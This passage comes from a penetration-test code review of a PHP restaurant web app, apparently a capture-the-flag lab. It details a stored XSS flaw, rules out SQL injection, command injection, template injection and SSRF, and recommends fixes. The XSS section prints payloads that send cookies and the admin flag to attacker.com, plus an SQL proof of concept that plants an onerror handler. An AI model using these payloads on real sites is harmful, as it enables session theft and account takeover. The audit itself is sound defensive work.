   - **Rendered HTML:** `<img ... alt="" onerror="alert(document.cookie)">`
   - When image fails to load (or immediately with `onerror`), script executes

**Method 2: HTML Injection (text node):**
1. Payload injects HTML tags directly:
   - **Payload:** `<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>`
   - **Rendered HTML:** 
     ```html
     <li>
       <img src="..." alt="<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>">
       <img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>
     </li>
     ```
   - Second `<img>` tag executes onerror handler immediately

**Execution Flow:**
1. Attacker adds malicious restaurant name to their own favorites (or exploits IDOR to add to victim's favorites)
2. Victim logs in and navigates to `/profile.php`
3. Page loads favorites via AJAX: `api/get_favorite_restaurants.php?userId=X` (line 176)
4. Response contains malicious restaurant name
5. JavaScript loops through restaurants (line 183)
6. Malicious payload concatenated into HTML (lines 186-187)
7. jQuery `.append()` renders HTML with XSS payload
8. Payload executes in victim's browser context

**Impact:**
- **Session Hijacking:** Even more dangerous than index.php XSS because profile.php is accessed by authenticated users with active sessions
- **Admin FLAG Theft:** If admin user views profile page with malicious favorite, XSS can read the flag displayed at line 125 and exfiltrate it:
  ```javascript
  Payload: <img src=x onerror="fetch('https://attacker.com/flag?data='+document.getElementById('admin-flag').innerText)">
  ```
- **Account Takeover:** Call `/api/change_password.php` via AJAX from XSS context to change victim's password without their knowledge
- **Privilege Escalation Chain:** XSS on admin account → Read flag → Change admin password → Maintain persistence

**Network Accessible:** YES - `/profile.php` is accessible to all authenticated users (requires login but no special privileges)

**Proof of Concept:**

If the `favorite_restaurants` table contains:
```sql
INSERT INTO favorite_restaurants (user_id, restaurant_name) VALUES 
(1, '" onerror="alert(document.cookie)');
```

The rendered HTML becomes:
```html
<img src="static/images/restaurant1.jpg" ... alt="" onerror="alert(document.cookie)">
" onerror="alert(document.cookie)
```

The `onerror` handler executes immediately, displaying the session cookie. In a real attack, this would use `fetch()` to send cookies to an attacker server, enabling session hijacking and account takeover.

---

### SQL Injection Analysis - SECURE

**Finding:** **NO SQL INJECTION VULNERABILITIES**

All database queries across the application use **PDO prepared statements with parameter binding**, providing strong protection against SQL injection. Analysis of all 5 API endpoints confirms consistent secure query patterns:

**Secure Implementation Examples:**

1. **`/api/login.php` (Lines 12-14):**
   ```php
   $stmt = $db->prepare('SELECT * FROM users WHERE username = :username');
   $stmt->execute(['username' => $username]);
   ```
   ✅ Named parameter `:username` with array binding

2. **`/api/search_restaurants.php` (Lines 12-15):**
   ```php
   $stmt = $db->prepare('SELECT * FROM restaurants WHERE name LIKE :name_query OR category LIKE :category_query');
   $stmt->bindParam(':name_query', $searchQuery, PDO::PARAM_STR);
   $stmt->bindParam(':category_query', $searchQuery, PDO::PARAM_STR);
   $stmt->execute();
   ```
   ✅ LIKE queries with parameter binding, explicit PDO::PARAM_STR type

3. **`/api/get_favorite_restaurants.php` (Lines 17-24):**
   ```php
   $stmt = $db->prepare('
       SELECT users.username, favorite_restaurants.restaurant_name 
       FROM favorite_restaurants 
       JOIN users ON favorite_restaurants.user_id = users.id 
       WHERE users.id = :user_id
   ');
   $stmt->bindParam(':user_id', $userId, PDO::PARAM_INT);
   $stmt->execute();
   ```
   ✅ Complex JOIN with parameter binding, explicit PDO::PARAM_INT type

**Critical Security Configuration:**
`/app/website/include/config.php` (Line 12) sets `PDO::ATTR_EMULATE_PREPARES => false`, ensuring true prepared statements at MySQL protocol level rather than client-side emulation, providing maximum SQL injection protection.

**Result:** SQL injection is **NOT EXPLOITABLE** in this application due to consistent secure coding practices.

---

### Command Injection Analysis - NOT APPLICABLE

**Finding:** **NO COMMAND INJECTION VECTORS**

Comprehensive code analysis found **no system command execution functions** in the application:

**Functions Searched (Not Found):**
- `exec()` - Not used
- `shell_exec()` - Not used  
- `system()` - Not used
- `passthru()` - Not used
- `proc_open()` - Not used
- `popen()` - Not used
- Backtick operators (`` `command` ``) - Not used

The application does not execute system commands, process user input through shell interpreters, or interact with the operating system command layer. All functionality is implemented through PHP native functions and MySQL queries.

**Result:** Command injection is **NOT APPLICABLE** to this application.

---

### Template Injection Analysis - NOT APPLICABLE

**Finding:** **NO SERVER-SIDE TEMPLATE ENGINES**

The application does not use any server-side template rendering engines:

**Template Engines Searched (Not Found):**
- Twig - Not installed
- Blade (Laravel) - Not installed
- Smarty - Not installed
- Mustache - Not installed
- Handlebars (server-side) - Not installed

All server-side rendering is performed using **inline PHP with `<?php ?>` tags**, and output encoding is handled manually via `htmlspecialchars()` where implemented. While this approach creates XSS vulnerabilities due to inconsistent encoding, it does not create template injection vulnerabilities.

**Result:** Template injection is **NOT APPLICABLE** to this application.

---

### Summary of XSS Vulnerabilities

**Total XSS Sinks Found:** 2 CRITICAL vulnerabilities  
**Risk Level:** CRITICAL - Both vulnerabilities allow arbitrary JavaScript execution  
**Exploitability:** HIGH - Both are in network-accessible pages with no CSP protection  
**Impact:** Session hijacking, account takeover, FLAG exfiltration, privilege escalation

**Remediation Priority:**
1. **Immediate:** Replace unsafe jQuery `.append(htmlString)` with safe DOM builder methods: `.append($('<element>').text(userContent))`
2. **Short-term:** Implement Content Security Policy (CSP) headers to restrict inline script execution
3. **Long-term:** Adopt a templating engine with automatic XSS escaping (Twig, Blade) or consistently use `htmlspecialchars()` for all output

---

## 10. SSRF Sinks

**COMPREHENSIVE ANALYSIS RESULT: NO SSRF VULNERABILITIES FOUND**

After exhaustive analysis of all network-accessible PHP files and API endpoints, **NO Server-Side Request Forgery (SSRF) sinks were identified** in this application. The codebase does not implement any functionality that makes outbound HTTP requests, fetches remote resources, or processes user-controlled URLs on the server side.

### Analysis Methodology

All 11 PHP files in the application were analyzed for SSRF attack vectors across the following categories:

### HTTP(S) Client Libraries - NOT FOUND

**Functions Searched:**
- `curl_init()`, `curl_setopt()`, `curl_exec()`, `curl_setopt_array()` - Not present
- `file_get_contents()` with HTTP/HTTPS URLs - Not present
- `fopen()`, `readfile()` with remote resources - Not present
- Guzzle HTTP client (`GuzzleHttp\Client`) - Not installed (no composer.json)
- PHP stream contexts with HTTP wrappers - Not present

**Result:** The application makes **no outbound HTTP requests** from server-side code.

### Raw Sockets & Network Connections - NOT FOUND

**Functions Searched:**
- `fsockopen()`, `pfsockopen()` - Not present
- `stream_socket_client()` - Not present
- `socket_create()`, `socket_connect()` - Not present

**Result:** The application creates **no raw socket connections** to external services.

### URL Openers & File Includes - NOT FOUND

**Functions Searched:**
- `file_get_contents()` - Not present
- `include()`, `require()`, `include_once()`, `require_once()` with dynamic URLs - Only static includes found (`include/config.php`)
- `simplexml_load_file()` - Not present
- `DOMDocument::load()`, `DOMDocument::loadHTMLFile()` - Not present
- `XMLReader::open()` - Not present

**Result:** No dynamic file inclusion or XML loading from user-controlled sources.

### Redirect & Location Headers - HARDCODED ONLY

**Locations Found:**

1. **`/profile.php` (Line 6):**
   ```php
   header('Location: login.php');
   ```
   - **Context:** Authentication redirect if user not logged in
   - **User Input:** None - hardcoded destination
   - **SSRF Risk:** None - static redirect

2. **`/logout.php` (Line 4):**
   ```php
   header('Location: login.php');
   ```
   - **Context:** Post-logout redirect
   - **User Input:** None - hardcoded destination
   - **SSRF Risk:** None - static redirect

**Result:** All redirects use hardcoded destinations. **No open redirect vulnerability**, no user-controlled Location headers.

### Headless Browsers & Render Engines - NOT FOUND

**Technologies Searched:**
- Puppeteer - Not installed
- Playwright - Not installed
- Selenium WebDriver - Not installed
- wkhtmltopdf - Not installed
- PhantomJS - Not installed

**Result:** No headless browser automation or PDF generation from URLs.

### Media Processors - NOT FOUND

**Libraries Searched:**
- ImageMagick (`Imagick` class, `convert` command) - Not present
- GraphicsMagick - Not present
- FFmpeg - Not present
- GD Library with URL loading - Not present

**Result:** No image or media processing from external URLs.

### Link Preview & Unfurlers - NOT FOUND

**Functionality Searched:**
- oEmbed endpoint fetchers - Not implemented
- Open Graph metadata scrapers - Not implemented
- Link preview generators - Not implemented
- URL metadata extractors - Not implemented

**Result:** No link preview or URL unfurling functionality.

### Webhook & Callback Systems - NOT FOUND

**Functionality Searched:**
- Webhook receivers - Not implemented (no POST endpoints that trigger outbound requests)
- Callback verification - Not implemented
- "Ping URL" functionality - Not implemented
- Event delivery systems - Not implemented

**Result:** No webhook or callback infrastructure.

### SSO/OIDC Discovery & JWKS - NOT FOUND

**Functionality Searched:**
- OpenID Connect discovery endpoints - Not implemented
- JWKS (JSON Web Key Set) fetchers - Not implemented
- OAuth authorization server metadata - Not implemented
- SAML metadata fetchers - Not implemented

**Result:** No federated authentication or SSO integration (application uses only username/password authentication).

### Data Importers & Feed Readers - NOT FOUND

**Functionality Searched:**
- "Import from URL" features - Not implemented
- RSS/Atom feed readers - Not implemented
- CSV/JSON/XML remote loaders - Not implemented
- API synchronization - Not implemented

**Result:** No remote data import functionality.

### Cloud Metadata Access - NOT FOUND

**Functionality Searched:**
- AWS EC2 metadata API calls (`http://169.254.169.254/`) - Not present
- GCP metadata server access - Not present
- Azure Instance Metadata Service - Not present
- Kubernetes API server calls - Not present

**Result:** No cloud provider metadata access.

### Out-of-Scope Items Excluded

**Docker Healthcheck (Correctly Excluded):**
- **Location:** `/docker-compose.yml` (Line 10)
- **Code:** `test: ["CMD", "curl", "-f", "http://127.0.0.1:80/"]`
- **Reason for Exclusion:** This is a **container orchestration health check**, not user-accessible functionality. It runs inside the container as an operational health verification and cannot be triggered or manipulated by network requests to the application.

### Conclusion

**NO SSRF VULNERABILITIES EXIST** in this application. The codebase:

- ✅ Makes no outbound HTTP/HTTPS requests
- ✅ Does not fetch remote resources
- ✅ Does not process user-controlled URLs on the server side
- ✅ Uses only hardcoded redirects (no open redirect)
- ✅ Has no webhook, callback, or external integration functionality
- ✅ Implements no SSO/OAuth flows that fetch remote metadata
- ✅ Has no import or data synchronization features

The application is a **self-contained web service** with all data stored and processed locally in MySQL. All external resources (Bootstrap, jQuery) are loaded **client-side from CDNs**, not server-side, and therefore do not constitute SSRF attack vectors.

**Risk Assessment:** SSRF risk is **NOT APPLICABLE** to this application.

---

**END OF PENETRATION TEST CODE ANALYSIS DELIVERABLE**